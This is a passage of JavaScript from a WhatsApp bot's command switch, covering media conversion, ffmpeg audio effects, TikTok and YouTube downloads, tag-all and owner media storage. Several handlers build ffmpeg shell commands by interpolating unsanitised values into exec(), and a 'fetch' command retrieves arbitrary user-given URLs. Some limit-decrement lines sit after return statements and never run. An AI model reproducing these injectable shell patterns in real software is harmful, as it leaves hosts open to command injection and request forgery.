		let media = await sock.downloadAndSaveMediaMessage(quoted)
		let ran = getRandom('.jpeg')
		exec(`ffmpeg -i ${media} -vf scale=${panjang}:${lebar} ${ran}`, async (err) => {
			fs.unlinkSync(media)
			if (err) return m.reply(`Err: ${err}`)
			let buffer453 = fs.readFileSync(ran)
			await sock.sendMessage(m.chat, {
				mimetype: 'image/jpeg',
				image: buffer453,
				caption: mess.done
			}, {
				quoted: m
			})
			fs.unlinkSync(ran)
		})
	} catch (error) {
		console.log(error);
		newReply('Failed during action, if you are the owner please check console.');
	};
}
db.data.users[m.sender].limit -= 1;
break

case "remini":
case "enhance": {
	if (!isPremium && db.data.users[m.sender].limit < 1) return newReply(mess.limit);
	if (m.sender in enhance) return newReply(`There is still an unfinished process, please wait until it's complete.`);
	let q = m.quoted ? m.quoted : m;
	let mime = (q.msg || q).mimetype || q.mediaType || "";
	if (!mime) return newReply(`Send/Reply Image With Caption ${prefix + command}`);
	if (!/image\/(jpe?g|png)/.test(mime)) return newReply(`Media not supported!`);
	enhance[m.sender] = true;
	const method = args[0]?.toLowerCase();
	const validMethods = ["enhance", "recolor", "dehaze"];
	const selectedMethod = validMethods.includes(method) ? method : "enhance";
	newReply(`⏳ Processing image using *${selectedMethod}* method, please wait...`);
	try {
		const media = await sock.downloadMediaMessage(m.quoted);
		const enhancedImage = await remini(media, selectedMethod);
		if (!enhancedImage) {
			return newReply("❌ Failed to process image. Try again later!");
		}
		const filename = `${selectedMethod}_result.jpg`;
		await sock.sendMessage(m.chat, { image: enhancedImage, caption: `✨ Image successfully enhanced using *${selectedMethod}* method` }, { quoted: m });
	} catch (error) {
		console.error(error);
		newReply("❌ An error occurred while processing the request. Try again later.");
	}
	delete enhance[m.sender];
	db.data.users[m.sender].limit -= 1;
	break;
}

case 'fetch': case 'get': {
	if (!isPremium && db.data.users[m.sender].limit < 1) return newReply("Oh Kak, your limit is already empty 😢. Let's upgrade to premium so you can freely use this feature! ✨");
	if (!isPremium) return newReply(mess.premium);
	if (!text.startsWith('http')) return newReply(`Hmm, you forgot to give the link? 😅\n\n*Example*: ${prefix + command} https://www.google.com`);
	try {
		const res = await axios.get(isUrl(text) ? isUrl(text)[0] : text);
		const contentType = res.headers['content-type'] || '';
		if (!isCreator && !contentType.includes('text/html')) {
			return newReply("Oops, this content isn't HTML and you're not the owner. So can't access. 😔");
		}
		if (isCreator || contentType.includes('text/html')) {
			return newReply(`Here you go Kak, the result:\n\n${util.format(res.data)} 😊`);
		} else {
			return newReply("Sorry Kak, this content isn't HTML so it can't be fetched. 😢");
		}
	} catch (e) {
		return newReply(`Oh no, there's an error Kak 😟\n${util.format(e)}\nPlease try again!`);
	}
}
db.data.users[m.sender].limit -= 1;
break;

case 'toptv': {
	if (!isPremium && db.data.users[m.sender].limit < 1) return newReply("Oh no, your limit is already empty 😔. Let's upgrade to premium so your limit doesn't run out quickly! 😊");
	if (!isPremium) return newReply(mess.premium);
	let q = m.quoted ? m.quoted : m;
	if (!/video|audio/.test(mime)) return newReply(`Hmm, you need to reply to the video or voice note you want to convert to MP3, don't forget to use caption *${prefix + command}* 😉`);
	try {
		let media = await q.download();
		let dataVideo = {
			ptvMessage: m.message.extendedTextMessage.contextInfo.quotedMessage.videoMessage
		};
		sock.relayMessage(m.chat, dataVideo, {});
	} catch (error) {
		console.log(error);
		newReply("Oh no, something went wrong Kak 😟. Please try again!");
	}
}
db.data.users[m.sender].limit -= 1;
break;

case 'tovn': {
	if (!isPremium && db.data.users[m.sender].limit < 1) return newReply("Kak, your limit is already empty 😢. Let's upgrade so you can freely use premium features! ✨");
	if (!/video/.test(mime) && !/audio/.test(mime)) return newReply(`Kak, you need to reply to the video or VN you want to convert to MP3, don't forget to use caption *${prefix + command}* 😊`);
	if (!quoted) return newReply(`Hmm, make sure you reply to video or VN with caption *${prefix + command}* 😉`);
	try {
		let media = await quoted.download();
		let audio = await toAudio(media, 'mp4');
		sock.sendMessage(m.chat, {
			audio,
			mimetype: 'audio/mpeg',
			ptt: true
		}, {
			quoted: m
		});
	} catch (error) {
		console.log(error);
		newReply("Oh no, there's an error Kak 😟. Please try again, I'm here to help!");
	}
}
db.data.users[m.sender].limit -= 1;
break;

case 'tinyurl': {
	if (!isPremium && db.data.users[m.sender].limit < 1) return newReply("Oh Kak, your limit is already empty 😢. Upgrade to premium so you can keep using this feature! ✨");
	if (!isPremium) return newReply(mess.premium);
	if (!text) return newReply(`It's easy to use, Kak! Type: *${prefix + command} link*\n\n*Send command*: *${prefix + command} https://google.com* 😊`);
	if (!isUrl(text)) return newReply(`Hmmm, I can only process valid links, Kak! Don't forget the format like this: *${prefix + command} https://google.com* 😉`);
	try {
		let tiny = await axios.get(`https://tinyurl.com/api-create.php?url=${text}`);
		let data = tiny.data;
		await newReply(`Tadaaa! Here's the shortened link, Kak: ${data} 😊`);
	} catch (error) {
		console.log(error);
		newReply("Oh no, there's an error Kak 😟. Try again, I'm sure I can help! ✨");
	}
}
db.data.users[m.sender].limit -= 1;
break;

case 'toaudio': 
case 'tomp3': {
	if (!isPremium && db.data.users[m.sender].limit < 1) return newReply(mess.limit);
	if (!/video/.test(mime) && !/audio/.test(mime)) return newReply(`Reply to Video/VN you want to convert to MP3 with caption ${prefix + command}`);
	if (!quoted) return newReply(`Reply to Video/VN you want to convert to MP3 with caption ${prefix + command}`);
	try {
		await m.react('⏱️');
		let media = await quoted.download();
		let audioBuffer = await toAudio(media, 'mp4');
		await sock.sendMessage(m.chat, { 
			audio: audioBuffer, 
			mimetype: 'audio/mpeg'
		}, { quoted: m });
			newReply(`✅ Successfully converted to MP3! 🎵`);
	} catch (err) {
		console.error('❌ Error:', err);
		newReply(`❌ Failed to convert to MP3. Check console for details.`);
	}
}
db.data.users[m.sender].limit -= 1;
break;

case 'bass': 
case 'blown': 
case 'deep': 
case 'earrape': 
case 'fast': 
case 'fat': 
case 'nightcore': 
case 'reverse': 
case 'robot': 
case 'slow': 
case 'smooth': 
case 'squirrel': {
	if (!isPremium && db.data.users[m.sender].limit < 1) return newReply(`⚠️ Hi Kak, your limit is empty! Come on, upgrade to premium to keep using this feature. 😊`);
	try {
		let set;
		if (/bass/.test(command)) set = '-af equalizer=f=54:width_type=o:width=2:g=20';
		if (/blown/.test(command)) set = '-af acrusher=.1:1:64:0:log';
		if (/deep/.test(command)) set = '-af atempo=4/4,asetrate=44500*2/3';
		if (/earrape/.test(command)) set = '-af volume=12';
		if (/fast/.test(command)) set = '-filter:a "atempo=1.63,asetrate=44100"';
		if (/fat/.test(command)) set = '-filter:a "atempo=1.6,asetrate=22100"';
		if (/nightcore/.test(command)) set = '-filter:a atempo=1.06,asetrate=44100*1.25';
		if (/reverse/.test(command)) set = '-filter_complex "areverse"';
		if (/robot/.test(command)) set = '-filter_complex "afftfilt=real=\'hypot(re,im)*sin(0)\':imag=\'hypot(re,im)*cos(0)\':win_size=512:overlap=0.75"';
		if (/slow/.test(command)) set = '-filter:a "atempo=0.7,asetrate=44100"';
		if (/smooth/.test(command)) set = '-filter:v "minterpolate=\'mi_mode=mci:mc_mode=aobmc:vsbmc=1:fps=120\'"';
		if (/squirrel/.test(command)) set = '-filter:a "atempo=0.5,asetrate=65100"';
		if (/audio/.test(mime)) {
			await m.react('⏱️');
			let media = await sock.downloadAndSaveMediaMessage(quoted);
			let ran = getRandom('.mp3');
			exec(`ffmpeg -i ${media} ${set} ${ran}`, (err, stderr, stdout) => {
				fs.unlinkSync(media);
				if (err) return newReply(`⚠️ Oops, something went wrong while processing audio. Please try again later, Kak! 🙏`);
				let buff = fs.readFileSync(ran);
				sock.sendMessage(m.chat, { audio: buff, mimetype: 'audio/mpeg' }, { quoted: m });
				fs.unlinkSync(ran);
				newReply(`✅ Audio successfully modified with *${command}* effect! Hope you like it, Kak! 🎶`);
			});
		} else {
			newReply(`⚠️ Please reply to the audio you want to modify with caption *${prefix + command}*, Kak! 🎧`);
		}
	} catch (e) {
		newReply(`⚠️ There's an error, Kak: ${e}. Please try again later! 🙏`);
	}
	db.data.users[m.sender].limit -= 1;
	break;
}

case 'listbadword': {
	let teks = '*🌟 Forbidden Words List 🌟*\n\n';
	teks += bad.map((word, index) => `- ${index + 1}. ${word}`).join('\n');
	teks += `\n\n✨ Total: *${bad.length}* words`;

	newReply(teks);
	break;
}

case 'afk': {
	if (!m.isGroup) return newReply(`⚠️ This command can only be used in groups, Kak! 😊`);
	if (isBot) return;
	if (isAfkOn) return;
	let reason = text ? text : 'No reason mentioned~ 🤭';
	addAfkUser(m.sender, Date.now(), reason, afk);
	let afkText = '🌙 *AFK Mode Active!* 🌙\n';
	afkText += `👤 *@${m.sender.split('@')[0]}* is now AFK!\n`;
	afkText += `💬 *Reason*: ${reason}\n\n`;
	afkText += `Don't forget to come back~ I miss you! 😊✨`;
	sock.sendTextWithMentions(m.chat, afkText, m);
	break;
}

case 'tagall': {
	if (!m.isGroup) return newReply(`This feature can only be used in groups, Kak!`)
	if (!isAdmins && !isGroupOwner && !isCreator) return newReply(`Sorry, Kak! You need to be an admin first to use this feature.`)
	if (!isBotAdmins) return newReply(`I need to be an admin first to execute this command. Please make me an admin!`)
	let pengirim = m.sender
	let teks = `🌸 *Tag All Group Members* 🌸\n\n`
	teks += `📣 *Tagger:* @${pengirim.split('@')[0]}\n`
	teks += `📩 *Message:* ${q ? q : 'No special message here!'}\n\n`
	for (let member of participants) {
		teks += `- @${member.id.split('@')[0]}\n`
	}
	sock.sendMessage(m.chat, {
		text: teks,
		mentions: participants.map(member => member.id)
	}, { quoted: m })
}
break

case 'h':
case 'hidetag': {
	if (!m.isGroup) return newReply(mess.group);
	if (!isAdmins && !isCreator) return newReply(mess.admin);
	if (m.quoted) {
		sock.sendMessage(m.chat, {
			forward: m.quoted.fakeObj,
			mentions: participants.map(a => a.id)
		})
	}
	if (!m.quoted) {
		sock.sendMessage(m.chat, {
			text: text ? text : '',
			mentions: participants.map(a => a.id)
		}, {
			quoted: fconver
		})
	}
}
break

case 'delete':
case 'd':
case 'del': {
	if (!isAdmins && !isCreator && !isPremium) return newReply('Failed to delete message, only owner and premium users can delete messages!');
	if (!m.quoted) return newReply('Kak, you need to send the message you want to delete! 🤔')
	await sock.sendMessage(m.chat, {
		delete: {
			remoteJid: m.chat,
			id: m.quoted.id,
			participant: m.quoted.sender
		}
	})
}
break

case 'autoswview':
case 'autostatusview':{
	if (!isCreator) return newReply(mess.owner);
	if (args.length < 1) return newReply(`❗ *Send command*:\n${prefix + command} true/false`)
	if (args[0] === 'true') {
		autoswview = true
		await newReply(mess.done);
	} else if (args[0] === 'false') {
		autoswview = false
		await newReply(mess.done);
	}
}
break;

case 'anticall': {
	if (!isCreator) return newReply(mess.owner);
	if (args.length < 1) return newReply(`❗ *Send command*:\n${prefix + command} true/false`)
	if (args[0] === 'true') {
		anticall = true
		await newReply(mess.done);
	} else if (args[0] === 'false') {
		anticall = false
		await newReply(mess.done);
	}
}
break;

case 'addvideo': {
	if (!isCreator) return newReply('⚠️ This command is only for the bot owner.');
	if (!q) return newReply('❓ Video name not mentioned, Kak!');
	if (videonye.includes(q)) return newReply('⚠️ This name already exists in the database.');
	let filePath = await sock.downloadAndSaveMediaMessage(quoted);
	videonye.push(q);
	await fsx.copy(filePath, `./media/${q}.mp4`);
	fs.writeFileSync('./media/database/video.json', JSON.stringify(videonye));
	fs.unlinkSync(filePath);
	newReply('✅ Video successfully added to database!');
	break;
}

case 'delvideo': {
	if (!isCreator) return newReply('⚠️ This command is only for the bot owner.');
	if (!q) return newReply('❓ Video name to delete not mentioned, Kak!');
	if (!videonye.includes(q)) return newReply('⚠️ This name does not exist in the database.');
	let index = videonye.indexOf(q);
	videonye.splice(index, 1);
	fs.writeFileSync('./media/database/video.json', JSON.stringify(videonye));
	fs.unlinkSync(`./media/${q}.mp4`);
	newReply('✅ Video successfully deleted from database!');
	break;
}

case 'listvideo': {
	let teks = '*🎥 Saved Videos List 🎥*\n\n';
	teks += videonye.map((video, i) => `- ${i + 1}. ${video}`).join('\n');
	teks += `\n\n✨ Total: *${videonye.length}* videos.`;
	newReply(teks);
	break;
}

case 'addimage': {
	if (!isCreator) return newReply('⚠️ This command is only for the bot owner.');
	if (!q) return newReply('❓ Image name not mentioned, Kak!');
	if (imagenye.includes(q)) return newReply('⚠️ This name already exists in the database.');
	let filePath = await sock.downloadAndSaveMediaMessage(quoted);
	imagenye.push(q);
	await fsx.copy(filePath, `./media/${q}.jpg`);
	fs.writeFileSync('./media/database/image.json', JSON.stringify(imagenye));
	fs.unlinkSync(filePath);
	newReply('✅ Image successfully added to database!');
	break;
}

case 'delimage': {
	if (!isCreator) return newReply('⚠️ This command is only for the bot owner.');
	if (!q) return newReply('❓ Image name to delete not mentioned, Kak!');
	if (!imagenye.includes(q)) return newReply('⚠️ This name does not exist in the database.');
	let index = imagenye.indexOf(q);
	imagenye.splice(index, 1);
	fs.writeFileSync('./media/database/image.json', JSON.stringify(imagenye));
	fs.unlinkSync(`./media/${q}.jpg`);
	newReply('✅ Image successfully deleted from database!');
	break;
}

case 'listimage': {
	let teks = '*🖼️ Saved Images List 🖼️*\n\n';
	teks += imagenye.map((image, i) => `- ${i + 1}. ${image}`).join('\n');
	teks += `\n\n✨ Total: *${imagenye.length}* images.`;
	newReply(teks);
	break;
}

case 'addsticker': {
	if (!isCreator) return newReply('⚠️ This command is only for the bot owner.');
	if (!q) return newReply('❓ Sticker name not mentioned, Kak!');
	if (setiker.includes(q)) return newReply('⚠️ This name already exists in the database.');
	let filePath = await sock.downloadAndSaveMediaMessage(quoted);
	setiker.push(q);
	await fsx.copy(filePath, `./media/${q}.webp`);
	fs.writeFileSync('./media/database/sticker.json', JSON.stringify(setiker));
	fs.unlinkSync(filePath);
	newReply('✅ Sticker successfully added to database!');
	break;
}

case 'delsticker': {
	if (!isCreator) return newReply('⚠️ This command is only for the bot owner.');
	if (!q) return newReply('❓ Sticker name to delete not mentioned, Kak!');
	if (!setiker.includes(q)) return newReply('⚠️ This name does not exist in the database.');
	let index = setiker.indexOf(q);
	setiker.splice(index, 1);
	fs.writeFileSync('./media/database/sticker.json', JSON.stringify(setiker));
	fs.unlinkSync(`./media/${q}.webp`);
	newReply('✅ Sticker successfully deleted from database!');
	break;
}

case 'liststicker': {
	let teks = '*🌟 Saved Stickers List 🌟*\n\n';
	teks += setiker.map((sticker, i) => `- ${i + 1}. ${sticker}`).join('\n');
	teks += `\n\n✨ Total: *${setiker.length}* stickers.`;
	newReply(teks);
	break;
}

case 'addvn': {
	if (!isCreator) return newReply('⚠️ This command is only for the bot owner.');
	if (!q) return newReply('❓ Audio name not mentioned, Kak!');
	if (audionye.includes(q)) return newReply('⚠️ This name already exists in the database.');
	let filePath = await sock.downloadAndSaveMediaMessage(quoted);
	audionye.push(q);
	await fsx.copy(filePath, `./media/${q}.mp3`);
	fs.writeFileSync('./media/database/audio.json', JSON.stringify(audionye));
	fs.unlinkSync(filePath);
	newReply('✅ Audio successfully added to database!');
	break;
}

case 'delvn': {
	if (!isCreator) return newReply('⚠️ This command is only for the bot owner.');
	if (!q) return newReply('❓ Audio name to delete not mentioned, Kak!');
	if (!audionye.includes(q)) return newReply('⚠️ This name does not exist in the database.');
	let index = audionye.indexOf(q);
	audionye.splice(index, 1);
	fs.writeFileSync('./media/database/audio.json', JSON.stringify(audionye));
	fs.unlinkSync(`./media/${q}.mp3`);
	newReply('✅ Audio successfully deleted from database!');
	break;
}

case 'listvn': {
	let teks = '*🎶 Saved Audio List 🎶*\n\n';
	teks += audionye.map((audio, i) => `- ${i + 1}. ${audio}`).join('\n');
	teks += `\n\n✨ Total: *${audionye.length}* audio.`;
	newReply(teks);
	break;
}

case 'q':
case 'quoted': {
	if (!quoted) return newReply(`Please reply to the message you want to quote, Kak! 🙏`);
	let gwm = await sock.serializeM(await m.getQuotedObj());
	if (!gwm.quoted) return newReply(mess.error);
	try {
		await gwm.quoted.copyNForward(m.chat, true);
	} catch (err) {
		console.log(err);
		newReply(mess.error);
	}
};
break

case 'yts': 
case 'ytsearch': {
	if (!isPremium && db.data.users[m.sender].limit < 1) return newReply(mess.limit);
	if (!text) return newReply(`🔍 *Where's the video title or keywords, Kak?*\n\nExample:\n${prefix + command} story wa anime`);
	try {
		await m.react('⏳');
		let search = await yts(text);
		if (!search || !search.videos || search.videos.length === 0) {
			return newReply(`❌ *Video not found!* Try other keywords, Kak.`);
		}
		let results = search.videos.slice(0, 5);
		for (let i = 0; i < results.length; i++) {
			let video = results[i];
			let caption = `🔢 *No*: ${i + 1}\n`;
			caption += `🎬 *Title*: ${video.title || 'No title'}\n`;
			caption += `👤 *Channel*: ${video.author?.name || 'Unknown'}\n`;
			caption += `👁️ *Views*: ${video.views || 'Unknown'}\n`;							caption += `⏳ *Duration*: ${video.timestamp || 'Unknown'}\n`;
			caption += `📆 *Uploaded*: ${video.ago || 'Unknown'}\n`;
			caption += `🔗 *Link*: ${video.url || 'No link'}\n`;
			await sock.sendMessage(m.chat, {
				image: { url: video.thumbnail || imageUrl },
				caption: caption,
			}, { 
				quoted: m 
			});
		}
		newReply(`✅ *Successfully displayed 5 search results from YouTube!*`);
	} catch (err) {
		console.error(err);
		newReply(`❌ *An error occurred while searching for video!* 😭\n${err.message || err}`);
	}
}
db.data.users[m.sender].limit -= 1;
break;

case 'hdoc': 
case 'halodoc': 
case 'cari': {
	if (!text) return newReply('Enter the command in format:\n*!cari [disease]*\n\n*Send command*: *!cari diabetes*');
	const query = text.trim();
	const data = await halodoc(query);
	try {
		newReply('🔍 Searching for information, please wait...');
		const articles = await data.getArtikelSearch();
		const obatList = await data.getObatSearch();
		if (articles.length === 0 && obatList.length === 0) {
			return newReply('❌ No information found related to the searched disease.');
		}
		let artikelResult = '*📚 Articles About Disease:*\n';
		for (let i = 0; i < Math.min(articles.length, 5); i++) { // Max 5 results
			const { title, description, link } = articles[i];
			artikelResult += `\n*${i + 1}. ${title}*\n${description}\n`;
		}
		let obatResult = '\n*💊 Recommended Medicines:*\n';
		for (let i = 0; i < Math.min(obatList.length, 5); i++) { // Max 5 results
			const { title, subtitle, price, link } = obatList[i];
			obatResult += `\n*${i + 1}. ${title}*\n${subtitle}\n💰 Price: ${price}\n`;
		}
		await newReply(artikelResult + obatResult);
	} catch (error) {
		console.error(error);
		newReply('❌ An error occurred while searching for information. Try again later.');
	}
}
db.data.users[m.sender].limit -= 1;
break;

case 'lirik': 
case 'lyrics': {
	if (!isPremium && db.data.users[m.sender].limit < 1) return newReply(mess.limit);
	if (!text) return newReply(`⚠️ Kak, don't forget to write the song title! 🥺\n*Send command*: *${prefix + command} Someone Like You*`);
	try {
		const searchResults = await lyrics.search(text);
		if (searchResults.length === 0) {
			return newReply('⚠️ No results found for that song. Try another title, please! 🎶');
		}
		const firstResult = searchResults[0];
		let captionText = `🎵 *Song Lyrics Found!* 🎵\n\n`;
		captionText += `📌 *Title*: ${firstResult.title}\n`;
		captionText += `🎤 *Artist*: ${firstResult.artist}\n`;
		captionText += `💿 *Album*: ${firstResult.album}\n`;
		captionText += `🔗 *Full Lyrics*: ${firstResult.link}\n`;
		captionText += `🖼️ *Image*: ${firstResult.imageUrl || 'No image'}\n\n`;
		captionText += `_Fetching full lyrics, please wait..._`;
		await await newReply(captionText);
		const lyricsData = await lyrics.getLyrics(firstResult.link);
		let lyricsResponse = `🎼 *Full Lyrics: ${firstResult.title}* 🎼\n\n`;
		lyricsResponse += `${lyricsData.lyrics || 'Lyrics not available.'}\n\n`;
		lyricsResponse += `📅 *Release Year*: ${lyricsData.year || 'Unknown'}\n`;
		lyricsResponse += `🎧 *Playlist*: ${lyricsData.playlists || 'No playlist'}\n`;
		lyricsResponse += `🖼️ *Artist*: ${lyricsData.artistImage || 'No artist image'}\n`;
		newReply(lyricsResponse);
	} catch (error) {
		console.error(error);
		newReply('⚠️ An error occurred while searching for song lyrics. Try again later, Kak!');
	}
}
db.data.users[m.sender].limit -= 1;
break;

case 'yt':
case 'play':
case 'ytplay': {
	if (!isPremium && db.data.users[m.sender].limit < 1) return newReply(mess.limit);
	if (!text) return newReply(`*Send command*: ${prefix + command} Favorite song`);
	try {
		await m.react('⏱️');
		const search = await yts(`${text}`);
		if (!search || search.all.length === 0) return newReply(`*Song not found!* ☹️`);
		const { 
			videoId, 
			image, 
			title, 
			views, 
			duration, 
			author, 
			ago, 
			url, 
			description 
		} = search.all[0];
		const button = [{
			"name": "single_select",
			"buttonParamsJson": `{
				"title": "Click Here ⎙",
				"sections": [
					{
						"title": "Download Audio 🎧",
						"rows": [
							{
								"header": "Audio Auto 🎵",
								"title": "Download Audio - Automatic Quality",
								"id": ".ytmp3 ${url}"
							}
						]
					},
					{
						"title": "Download Video 🎥",
						"rows": [
							{
								"header": "Video Auto 🎥",
								"title": "Download Video - Automatic Quality",
								"id": ".ytmp4 ${url}"
							}
						]
					}
				]
			}`
		}];
		let caption = `*${title}*\n\n`;
		caption += `*🎶 Type*: Play\n`;
		caption += `*📌 ID*: ${videoId}\n`;
		caption += `*⏱️ Duration*: ${duration}\n`;
		caption += `*🕒 Uploaded*: ${ago}\n`;
		caption += `*🔗 Link*: ${url}\n\n`;
		caption += `_*Choose the type of download you need... pick what's most suitable for you!*_`;
		sock.sendButtonImage(m.chat, { url: image }, button, caption, footer, m)
	} catch (error) {
		console.log(error);
		newReply('Failed during action, if you are the owner please check console.');
	};
	db.data.users[m.sender].limit -= 1;
	break;
}

case 'ytaudio': 
case 'ytmp3': {
	if (!isPremium && db.data.users[m.sender].limit < 1) return newReply(mess.limit);
	if (!text) return newReply(`*Send command*: ${prefix + command} <url>`);
	const youtubeRegex = /^(https?:\/\/)?(www\.)?(youtube\.com\/(watch\?v=|embed\/|v\/|shorts\/)|youtu\.be\/)([a-zA-Z0-9_-]{11})(\S*)?$/;
	if (!youtubeRegex.test(text)) return newReply(`The link you entered is not a valid YouTube link! 😅`);
	try {
		const result = await youtube(text);
		if (result && result.mp3) {
			let captionText = `*${result.title}*\n\n`;
			captionText += `- *Creator*: ${result.name || "Unknown"}\n`;
			captionText += `- *Views*: ${formatAngka(result.views || "0")}\n`;
			captionText += `- *Upload*: ${result.ago || "Unknown"}\n`;
			captionText += `- *Status*: Done! ✅\n\n`;
			captionText += `_Wait a moment, media is being sent..._`;
			await newReply(captionText);
			await sock.sendMessage(m.chat, { 
				audio: { url: result.mp3 }, 
				mimetype: 'audio/mp4' 
			}, { 
				quoted: m 
			});
		} else {
			newReply("Failed to fetch data from YouTube.");
		}
	} catch (err) {
		console.error(err);
		await m.react('😭');
		newReply('*Data not found!* ☹️');
	}
	db.data.users[m.sender].limit -= 1;
	break;
}

case 'ytmp4': 
case 'ytvideo': 
case 'ytv': {
	if (!isPremium && db.data.users[m.sender].limit < 1) return newReply(mess.limit);
	if (!text) return newReply(`*Send command*: ${prefix + command} <url>`);
	const youtubeRegex = /^(https?:\/\/)?(www\.)?(youtube\.com\/(watch\?v=|embed\/|v\/|shorts\/)|youtu\.be\/)([a-zA-Z0-9_-]{11})(\S*)?$/;
	if (!youtubeRegex.test(text)) return newReply(`The link you entered is not a valid YouTube link! 😅`);
	try {
		const result = await youtube(text);
		if (result && result.mp4) {
			let captionText = `*${result.title}*\n\n`;
			captionText += `- *Creator*: ${result.name || "Unknown"}\n`;
			captionText += `- *Views*: ${formatAngka(result.views || "0")}\n`;
			captionText += `- *Upload*: ${result.ago || "Unknown"}\n`;
			captionText += `- *Status*: Done! ✅`;
			sock.sendMessage(m.chat, { 
				video: { url: result.mp4 }, 
				caption: captionText 
			}, { 
				quoted: m 
			});
		} else {
			newReply("Failed to fetch data from YouTube.");
		}
	} catch (err) {
		console.error(err);
		await m.react('😭');
		newReply('*Data not found!* ☹️');
	}
	db.data.users[m.sender].limit -= 1;
	break;
}

case 'tiktokslide':
case 'ttslide':
case 'tiktokfoto':
case 'tiktokmp4':
case 'tt':
case 'ttnowm':
case 'tiktoknowm':
case 'tiktok': {
	if (!isPremium && db.data.users[m.sender].limit < 1) return newReply(mess.limit);
	if (!text) return newReply(`⚠️ Hmm... You haven't given a link! 🫣 Try typing like this: *${prefix + command} <url>*`);
	try {
		await m.react('⏱️');
		let anu = await tiktokDownloaderVideo(text);
		let item = 0;
		for (let imgs of anu.data) {
			if (imgs.type == "nowatermark") {
				await sock.sendMessage(
					m.chat,
					{
						video: { url: imgs.url },
						caption: `🎥 *Video Info*:\n📍 Region: ${anu.region}\n⏳ Duration: ${anu.duration}\n📅 Taken: ${anu.taken_at}\n\n📊 *Statistics Info*:\n👁️ Views: ${anu.stats.views}\n❤️ Likes: ${anu.stats.likes}\n💬 Comment: ${anu.stats.comment}\n🔄 Share: ${anu.stats.share}\n📥 Download: ${anu.stats.download}\n\n👤 *Author Info*:\n📝 Fullname: ${anu.author.fullname}\n🏷️ Nickname: ${anu.author.nickname}\n\n🎵 *Music Info*:\n🎼 Title: ${anu.music_info.title}\n🎤 Author: ${anu.music_info.author}\n💿 Album: ${anu.music_info.album}\n\n📝 *Caption*:\n${anu.title || 'No Caption'}`
					},
					{ quoted: m }
				);
			}
			if (imgs.type == "photo") {
				if (item == 0) {
					await sock.sendMessage(
						m.chat,
						{
							image: { url: imgs.url },
							caption: `🖼️ *Photo Info*:\n📍 Region: ${anu.region}\n📅 Taken: ${anu.taken_at}\n\n📊 *Statistics Info*:\n👁️ Views: ${anu.stats.views}\n❤️ Likes: ${anu.stats.likes}\n💬 Comment: ${anu.stats.comment}\n🔄 Share: ${anu.stats.share}\n📥 Download: ${anu.stats.download}\n\n👤 *Author Info*:\n📝 Fullname: ${anu.author.fullname}\n🏷️ Nickname: ${anu.author.nickname}\n\n🎵 *Music Info*:\n🎼 Title: ${anu.music_info.title}\n🎤 Author: ${anu.music_info.author}\n💿 Album: ${anu.music_info.album}\n\n📝 *Caption*:\n${anu.title || 'No Caption'}${m.isGroup ? anu.data.length > 1 ? "\n📥 _Remaining photos sent to private chat_\n" : "\n" : "\n"}`
						},
						{ quoted: m }
					);
				} else {
					await sock.sendMessage(
						m.sender,
						{
							image: { url: imgs.url }
						},
						{ quoted: m }
					);
				}
				item += 1;
				await sleep(2000);
			}
		}
	} catch (err) {
		console.log(err);
		newReply('⚠️ Failed to fetch data from TikTok. Make sure the URL is valid or try again later.');
	}
}
db.data.users[m.sender].limit -= 1;
break;

case 'ttaudio':
case 'tiktokmp3':
case 'ttmp3':
case 'tiktokaudio': {
	if (!isPremium && db.data.users[m.sender].limit < 1) return newReply(mess.limit);
	if (!text) return newReply(`⚠️ Hmm... You haven't given a link! 🫣 Try typing like this: *${prefix + command} <url>*`);
	try {
		await m.react('⏱️');
		let anu = await tiktokDownloaderVideo(text);
		let audio = anu.music_info.url;
		await sock.sendMessage(
			m.chat,
			{
				text: `🎵 *TikTok Audio*\n\n` +
				`🎼 *Title*: ${anu.music_info.title || '-'}\n` +
				`🎤 *Author*: ${anu.music_info.author || '-'}\n` +
				`💿 *Album*: ${anu.music_info.album || '-'}\n\n` +
				`🔗 *Source*: ${text}`
			},
			{ quoted: m }
		);
		await sock.sendMessage(
			m.chat,
			{
				audio: { url: audio },
				mimetype: 'audio/mpeg',
				fileName: `${anu.music_info.title || 'audio'}.mp3`
			},
			{ quoted: m }
		);
	} catch (error) {
		console.error(error);
		await newReply(`❌ An error occurred while fetching audio. Try again later, Kak!`);
	}
}
db.data.users[m.sender].limit -= 1;
break;

case 'tiktoksearch':
case 'tiktoks':
case 'ttsearch': {
	if (!isPremium && db.data.users[m.sender].limit < 1) return newReply("Oh Kak, your limit is already empty 😢. Let's upgrade to premium so you can keep using this feature! ✨");
	if (!text) return newReply(`⚠️ Oops, you forgot to give keywords! 😅\nTry typing like this: *${prefix + command} <query>*`);
	try {
		await m.react('⏱️');
		let search = await tiktokSearchVideo(text);
		let teks = `🎥 *${search.videos[0].title}*\n\n`;
		teks += `🆔 *Video ID*: ${search.videos[0].video_id}\n`;
		teks += `👤 *Username*: ${search.videos[0].author.unique_id}\n`;
		teks += `🏷️ *Nickname*: ${search.videos[0].author.nickname}\n`;
		teks += `⏳ *Duration*: ${search.videos[0].duration} seconds\n`;
		teks += `❤️ *VT Like*: ${search.videos[0].digg_count}\n`;
		teks += `💬 *Comment*: ${search.videos[0].comment_count}\n`;
		teks += `🔄 *Share*: ${search.videos[0].share_count}\n\n`;
		teks += `🔗 *Link*: https://www.tiktok.com/@${search.videos[0].author.unique_id}/video/${search.videos[0].video_id}`;
		let list = '';
		let no = 1;
		for (let i of search.videos) {
			list += `\n${no++}. 🎵 *${i.title}*\n`;
			list += `⏳ *Duration*: ${i.duration} seconds\n`;
			list += `❤️ *Likes*: ${i.digg_count}\n`;
			list += `💬 *Comments*: ${i.comment_count}\n`;
			list += `🔄 *Shares*: ${i.share_count}\n`;
			list += `🔗 *Link*: https://www.tiktok.com/@${i.author.unique_id}/video/${i.video_id}\n`;
		}
		await sock.sendMessage(
			m.chat,
			{
				video: { url: `https://tikwm.com${search.videos[0].play}` },
				caption: teks
			},
			{ quoted: m }
		);
		if (search.videos.length > 1) {
			await sock.sendMessage(
				m.chat,
				{
					text: `📚 *List of Other Videos:*\n${list}`
				},
				{ quoted: m }
			);
		}
	} catch (error) {
		console.log(error);
		newReply("Oh no, there's an error Kak 😟. Try again, I'm ready to help! ✨");
	}
}
db.data.users[m.sender].limit -= 1;
break;

case 'scroll':
case 'carivideo': {
	if (!isPremium && db.data.users[m.sender].limit < 1) return newReply("Oh Kak, your limit is already empty 😢. Let's upgrade to premium so you can be freer to use this feature! ✨");
	if (!isPremium) return newReply("This feature is only for premium users, Kak! Upgrade now to use this feature 😊.");
